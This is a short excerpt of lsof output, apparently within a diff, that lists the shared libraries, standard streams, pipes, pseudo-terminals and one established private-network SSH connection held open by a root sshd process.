+sshd    7802 root  mem    REG              253,0    14872 69162364 /usr/lib64/libutil-2.17.so
+sshd    7802 root  mem    REG              253,0    61952 67714660 /usr/lib64/liblber-2.4.so.2.10.7
+sshd    7802 root  mem    REG              253,0   352584 67714662 /usr/lib64/libldap-2.4.so.2.10.7
+sshd    7802 root  mem    REG              253,0    19776 67224386 /usr/lib64/libdl-2.17.so
+sshd    7802 root  mem    REG              253,0  2512832 68349464 /usr/lib64/libcrypto.so.1.0.2k
+sshd    7802 root  mem    REG              253,0   203800 67591889 /usr/lib64/libsystemd.so.0.6.0
+sshd    7802 root  mem    REG              253,0   155784 67263196 /usr/lib64/libselinux.so.1
+sshd    7802 root  mem    REG              253,0    61672 67566704 /usr/lib64/libpam.so.0.83.1
+sshd    7802 root  mem    REG              253,0   127184 67311373 /usr/lib64/libaudit.so.1.0.0
+sshd    7802 root  mem    REG              253,0    42520 67337366 /usr/lib64/libwrap.so.0.7.6
+sshd    7802 root  mem    REG              253,0    11344 67714704 /usr/lib64/libfipscheck.so.1.2.1
+sshd    7802 root  mem    REG              253,0   164240 67224370 /usr/lib64/ld-2.17.so
+sshd    7802 root    0u   CHR                1,3      0t0     4674 /dev/null
+sshd    7802 root    1u   CHR                1,3      0t0     4674 /dev/null
+sshd    7802 root    2u   CHR                1,3      0t0     4674 /dev/null
+sshd    7802 root    3u  IPv4             613015      0t0      TCP 192.168.180.32:ssh->192.168.30.193:38648 (ESTABLISHED)
+sshd    7802 root    4u  unix 0xffff88003a59c3c0      0t0   613119 socket
+sshd    7802 root    5r  FIFO                0,8      0t0   613122 pipe
+sshd    7802 root    6w  FIFO               0,19      0t0   613115 /run/systemd/sessions/1550.ref
+sshd    7802 root    7w  FIFO                0,8      0t0   613122 pipe
+sshd    7802 root    8u   CHR                5,2      0t0     6385 /dev/ptmx
+sshd    7802 root   12u   CHR                5,2      0t0     6385 /dev/ptmx
+sshd    7802 root   13u   CHR                5,2      0t0     6385 /dev/ptmx
